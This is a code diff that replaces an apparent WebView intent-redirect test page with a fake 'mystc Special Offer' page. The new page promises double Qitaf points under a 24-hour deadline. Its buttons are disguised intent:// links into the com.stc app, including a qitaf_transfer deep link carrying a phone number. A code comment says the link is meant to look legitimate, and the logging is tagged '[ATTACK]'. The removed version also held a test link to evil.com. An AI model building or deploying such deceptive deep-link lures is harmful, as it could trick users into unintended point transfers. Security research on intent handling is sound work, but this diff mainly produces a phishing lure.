@@ -3,137 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Intent Redirect Test</title>
+    <title>mystc Special Offer</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background: #4a148c;
+            color: white;
         }
-        .container {
+        .header {
+            background: linear-gradient(135deg, #4a148c 0%, #7b1fa2 100%);
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #fff;
+        }
+        .content {
+            padding: 30px 20px;
             max-width: 600px;
             margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
         }
         h1 {
-            color: #333;
-            margin-bottom: 10px;
             font-size: 24px;
+            margin-bottom: 15px;
         }
-        p {
-            color: #666;
-            margin-bottom: 20px;
-            line-height: 1.6;
+        .offer {
+            background: white;
+            color: #333;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
         }
-        .test-link {
+        .offer h2 {
+            color: #4a148c;
+            margin-bottom: 10px;
+        }
+        .btn {
             display: block;
-            padding: 15px 20px;
-            margin: 12px 0;
-            background: #ff4757;
+            background: #ff6f00;
             color: white;
+            padding: 18px;
+            text-align: center;
             text-decoration: none;
             border-radius: 8px;
-            font-weight: 600;
-            text-align: center;
-            transition: all 0.3s;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px 0;
             border: none;
-            font-size: 16px;
         }
-        .test-link:active {
-            transform: scale(0.98);
-            background: #ee5a6f;
-        }
-        .warning {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 12px;
-            margin: 20px 0;
-            border-radius: 4px;
-            color: #856404;
-            font-size: 14px;
-        }
-        .success {
-            background: #d4edda;
-            border-left: 4px solid #28a745;
-            padding: 12px;
-            margin: 20px 0;
-            border-radius: 4px;
-            color: #155724;
-            font-size: 14px;
-        }
-        .code {
-            background: #f4f4f4;
-            padding: 8px 12px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 13px;
-            overflow-x: auto;
-            margin: 10px 0;
+        .terms {
+            font-size: 12px;
+            color: #999;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎯 WebView Intent Redirect Tests</h1>
-        <p>These tests demonstrate intent redirection vulnerabilities in WebView implementations.</p>
+    <div class="header">
+        <div class="logo">mystc</div>
+        <p>Your Mobile Services</p>
+    </div>
 
-        <div class="success">
-            ✅ Page loaded successfully via HTTPS
+    <div class="content">
+        <h1>🎁 Exclusive Qitaf Points Offer!</h1>
+
+        <div class="offer">
+            <h2>Limited Time: Double Qitaf Points!</h2>
+            <p>Transfer your Qitaf points now and receive <strong>100% bonus points</strong>!</p>
+            <p style="margin-top: 10px;">✓ Valid for the next 24 hours only<br>
+               ✓ All users eligible<br>
+               ✓ Instant credit</p>
         </div>
 
-        <h2 style="margin-top: 20px; font-size: 18px; color: #333;">Click tests below:</h2>
-
-        <a href="intent://example.com#Intent;scheme=https;S.browser_fallback_url=https://google.com;end" class="test-link">
-            TEST 1: Basic Intent Redirect
+        <!-- This looks like a legitimate mystc link but actually triggers intent -->
+        <a href="intent://qitaf_transfer#Intent;scheme=mystc;package=com.stc;S.phoneNumber=0500000000;end" class="btn">
+            Claim Bonus Points Now
         </a>
 
-        <a href="intent://evil.com#Intent;scheme=https;component=com.android.chrome/com.google.android.apps.chrome.Main;end" class="test-link">
-            TEST 2: Launch Chrome via Intent
+        <a href="intent://pay_postpaid#Intent;scheme=mystc;package=com.stc;end" class="btn" style="background:#2196f3;">
+            View Your Bills
         </a>
 
-        <a href="intent://qitaf_transfer#Intent;scheme=mystc;package=com.stc;end" class="test-link">
-            TEST 3: Launch mystc App
+        <a href="intent://profile#Intent;scheme=mystc;package=com.stc;end" class="btn" style="background:#4caf50;">
+            Update Profile Settings
         </a>
 
-        <a href="tel:+966500000000" class="test-link">
-            TEST 4: Phone Dialer
-        </a>
-
-        <a href="intent://maps.google.com#Intent;scheme=https;package=com.google.android.apps.maps;end" class="test-link">
-            TEST 5: Launch Google Maps
-        </a>
-
-        <div class="warning">
-            ⚠️ <strong>Expected behavior:</strong><br>
-            • Vulnerable WebView: Automatically launches intents without confirmation<br>
-            • Secure WebView: Blocks or requires user confirmation
+        <div class="terms">
+            * Terms and conditions apply. This is a security research demonstration.
         </div>
-
-        <h3 style="margin-top: 30px; font-size: 16px; color: #333;">Tested Intent URLs:</h3>
-        <div class="code">intent://abdulaziz-d.com#Intent;scheme=https;end</div>
-        <div class="code">intent://qitaf_transfer#Intent;scheme=mystc;package=com.stc;end</div>
-
-        <p style="margin-top: 20px; font-size: 14px; color: #999;">
-            Security Test - mystc WebView Vulnerability Assessment
-        </p>
     </div>
 
     <script>
-        // Log all clicks for debugging
-        document.querySelectorAll('.test-link').forEach(link => {
-            link.addEventListener('click', function(e) {
-                console.log('[TEST] Clicked:', this.href);
-                console.log('[TEST] Time:', new Date().toISOString());
+        // Log all button clicks
+        document.querySelectorAll('.btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                console.log('[ATTACK] Intent triggered:', this.href);
             });
         });
-
-        // Display when page loaded
-        console.log('[INFO] Test page loaded at:', new Date().toISOString());
     </script>
 </body>
 </html>
